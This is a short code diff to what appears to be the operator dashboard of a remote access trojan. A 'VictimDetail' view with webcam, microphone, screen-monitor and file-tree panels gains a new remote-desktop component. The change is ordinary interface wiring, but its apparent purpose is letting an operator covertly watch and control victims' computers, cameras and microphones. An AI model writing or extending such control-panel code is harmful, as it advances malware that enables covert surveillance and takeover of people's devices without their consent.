@@ -20,6 +20,7 @@ import { FileTree } from '@/components/file-tree';
 import { EventFeed } from '@/components/event-feed';
 import { ChatPanel } from '@/components/chat-panel';
 import { MonitorPanel } from '@/components/monitor-panel';
+import { RemoteDesktop } from '@/components/remote-desktop';
 import { WebcamPanel } from '@/components/webcam-panel';
 import { MicPanel } from '@/components/mic-panel';
 import { TimelinePanel } from '@/components/timeline-panel';
@@ -392,7 +393,8 @@ export function VictimDetail({
           </TabsContent>
 
           <TabsContent value="monitor" className="mt-0">
-            <MonitorPanel victim={victim} />
+            <RemoteDesktop victim={victim} />
+            <div className="mt-3"><MonitorPanel victim={victim} /></div>
             <div className="mt-3"><WebcamPanel victim={victim} /></div>
             <div className="mt-3"><MicPanel victim={victim} /></div>
             <div className="mb-2 mt-3 flex items-center justify-between border-t border-line pt-2">
